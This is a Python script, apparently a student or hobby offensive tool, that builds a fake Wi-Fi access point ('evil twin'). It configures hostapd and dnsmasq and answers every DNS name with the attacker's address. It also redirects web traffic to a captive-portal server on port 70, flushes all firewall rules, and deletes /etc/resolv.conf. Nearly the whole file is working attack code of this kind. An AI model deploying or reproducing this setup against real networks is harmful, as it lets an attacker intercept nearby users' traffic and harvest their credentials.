import os
import sys


def openAP(net_ssid,net_channel,interface,attack_interface):

    # Source: https://hakin9.org/create-a-fake-access-point-by-anastasis-vasileiadis/
    # Source: https://zsecurity.org/how-to-start-a-fake-access-point-fake-wifi/

    # enable monitor mode
    os.system(f'sudo ifconfig {interface} down')
    os.system(f'sudo iwconfig {interface} mode monitor')
    os.system(f'sudo ifconfig {interface} up')

    # Disable all old proccess
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    # os.system('service NetworkManager stop')

    # Clear port 53
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')


    # Create configuration files
    conf_text = f"interface={interface}\ndriver=nl80211\nssid={net_ssid}"\
    f"\nchannel={net_channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n"\
    "wme_enabled=1"
    conf_file = open("hostapd.conf", "w")
    n = conf_file.write(conf_text)
    conf_file.close()

    conf_text = f"interface={interface}\ndhcp-range=10.0.0.3,10.0.0.30,255.255.255.0,12h"\
    "\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nlisten-address=127.0.0.1"\
    "\nserver=8.8.8.8\naddress=/#/10.0.0.1"
    conf_file = open("dnsmasq.conf", "w")
    n = conf_file.write(conf_text)
    conf_file.close()


    # AP with address 10.0.0.1 on the given interface
    os.system(f"ifconfig {interface} up 10.0.0.1 netmask 255.255.255.0")

    # Add defualt gateway
    os.system("route add default gw 10.0.0.1")

    # Enable IP forwarding
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


    # Clear all IP Rules
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    
    # Allowing packets forwarding through the network.
    os.system('iptables -P FORWARD ACCEPT')

    # os.system(f"iptables -t nat -A POSTROUTING -s 10.10.0.0/16 -o pp0 -j MASQUERADE")

    # Change defualt port for capital portal to port 60
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 70')


    # Link dnsmasq to the configuration file.
    os.system("dnsmasq -C dnsmasq.conf")

    # Running the web server 
    os.system('service apache2 start')
    os.system('gnome-terminal -- sh -c "sudo node web/html/index.js;"$SHELL')
    os.system('route add default gw 10.0.0.1')

    # Link hostpad to the configuration file.
    # os.system('service NetworkManager stop')

    os.system("hostapd hostapd.conf")
    os.system('route add default gw 10.0.0.1')

    # print("ssssssssssssssssssssssssssssssssssssss")
    # os.system(f'sudo ifconfig {attack_interface} down')
    # os.system(f'sudo iwconfig {attack_interface} mode managed')
    # os.system(f'sudo ifconfig {attack_interface} up')

    # os.system(f'iptables --table nat --append POSTROUTING --out-interface {attack_interface} -j MASQUERADE')
    # os.system(f'iptables --append FORWARD --in-interface {interface} -j ACCEPT')

    # Reset all setting to defualt
    os.system("systemctl enable systemd-resolved.service >/dev/null 2>&1") 
    os.system("systemctl start systemd-resolved >/dev/null 2>&1") 
    os.system("sudo rm /etc/resolv.conf")
    os.system("sudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf")
    # os.system('service NetworkManager start')



if __name__ == "__main__":

    openAP(sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
